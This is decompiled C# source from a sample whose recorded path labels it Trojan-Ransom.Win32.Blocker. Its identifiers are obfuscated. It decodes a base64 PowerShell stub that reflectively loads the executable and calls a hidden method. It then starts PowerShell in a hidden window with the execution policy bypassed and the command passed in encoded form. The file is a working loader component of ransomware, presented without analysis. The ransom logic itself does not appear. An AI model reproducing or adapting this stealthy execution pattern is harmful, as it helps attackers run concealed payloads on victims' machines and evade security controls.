// Decompiled with JetBrains decompiler
// Type: _32._38
// Assembly: docview, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C1B09A8B-3F04-40ED-BFB8-BBA0804AB743
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\Trojan-Ransom.Win32.Blocker.mwap-9d0cc73772d79a0561d03db4e6aca9fad9b125afbbc7f2b4f7f3df25eeed56a0.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace _32
{
  internal class _38
  {
    private static _38.EventHandler _72;
    private static Process _16;

    [DllImport("Kernel32")]
    private static extern bool SetConsoleCtrlHandler(_38.EventHandler handler, bool add);

    private static bool _82(_38.CtrlType sig)
    {
      try
      {
        if (_38._16 != null)
        {
          Console.WriteLine("Aborting...");
          _38._16.Kill();
        }
      }
      catch
      {
      }
      return true;
    }

    private static string _93(string _17) => Encoding.Unicode.GetString(Convert.FromBase64String(_17));

    private static string _94(string _17) => Convert.ToBase64String(Encoding.Unicode.GetBytes(_17));

    private static void Main(string[] _55)
    {
      _38._72 += new _38.EventHandler(_38._82);
      _38.SetConsoleCtrlHandler(_38._72, true);
      string str1 = Guid.NewGuid().ToString();
      Environment.SetEnvironmentVariable("zumsel", str1, EnvironmentVariableTarget.Process);
      string location = Assembly.GetExecutingAssembly().Location;
      string _17 = string.Format("$x='{0}';$y='{1}';", (object) str1, (object) location) + _38._93("dAByAHkAIAB7AA0ACgAgACAAaQBmACAAKABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBWAGUAcgBzAGkAbwBuAC4ATQBhAGoAbwByACAALQBnAGUAIAA0ACkADQAKACAAIAB7ACAAJABuAHUAbABsACAAPQAgAFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBVAG4AcwBhAGYAZQBMAG8AYQBkAEYAcgBvAG0AKAAkAHkAKQAgAH0AIABlAGwAcwBlACAAewAgACQAbgB1AGwAbAAgAD0AIABbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZABGAGkAbABlACgAJAB5ACkAfQANAAoAIAAgAC4AIAAoAFsAXwAzADIALgBfADgAOABdADoAOgBfADcANAAoACQAeAApACkADQAKACAAIABlAHgAaQB0ACAAJABMAEEAUwBUAEUAWABJAFQAQwBPAEQARQANAAoAfQAgAA0ACgBjAGEAdABjAGgAIABbAE4AbwB0AFMAdQBwAHAAbwByAHQAZQBkAEUAeABjAGUAcAB0AGkAbwBuAF0ADQAKAHsADQAKACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIABsAG8AYwBhAHQAaQBvAG4AIABpAHMAIAB1AG4AdAByAHUAcwB0AGUAZAAuACAAQwBvAHAAeQAgAGYAaQBsAGUAIAB0AG8AIABhACAAbABvAGMAYQBsACAAZAByAGkAdgBlACwAIABhAG4AZAAgAHQAcgB5ACAAYQBnAGEAaQBuAC4AJwAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABSAGUAZAANAAoAfQANAAoAYwBhAHQAYwBoACAAewANAAoAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAoACIARQByAHIAbwByADoAIAAiACAAKwAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACAALQBGAG8AcgBlACAAUgBlAGQAIAANAAoAfQA=");
      string str2 = "";
      if (_55 != null && _55.Length == 1 && _55[0].Trim() == "/?")
        str2 = "-?";
      else if (_55 != null && _55.Length > 0)
      {
        foreach (string str3 in _55)
          str2 = !str3.Contains(" ") ? str2 + str3 + " " : str2 + "\"" + str3 + "\" ";
      }
      Environment.SetEnvironmentVariable("willi", str2, EnvironmentVariableTarget.Process);
      string str4 = Path.Combine(Environment.SystemDirectory, "windowspowershell\\v1.0\\powershell.exe");
      ProcessStartInfo startInfo = new ProcessStartInfo()
      {
        FileName = str4,
        Arguments = "-sta -noprofile -executionpolicy bypass -encodedcommand " + _38._94(_17),
        UseShellExecute = true,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      try
      {
        _38._16 = Process.Start(startInfo);
        try
        {
          if (_38._16 != null)
          {
            if (!_38._16.HasExited)
              _38._16.WaitForExit();
          }
        }
        finally
        {
          try
          {
            if (_38._16 != null)
            {
              if (!_38._16.HasExited)
                _38._16.Kill();
            }
          }
          catch
          {
          }
        }
        try
        {
          if (_38._16 == null)
            return;
          Environment.ExitCode = _38._16.ExitCode;
          Environment.Exit(_38._16.ExitCode);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine("Unable to launch application: " + ex.Message);
      }
    }

    private enum CtrlType
    {
      CTRL_C_EVENT = 0,
      CTRL_BREAK_EVENT = 1,
      CTRL_CLOSE_EVENT = 2,
      CTRL_LOGOFF_EVENT = 5,
      CTRL_SHUTDOWN_EVENT = 6,
    }

    private delegate bool EventHandler(_38.CtrlType sig);
  }
}
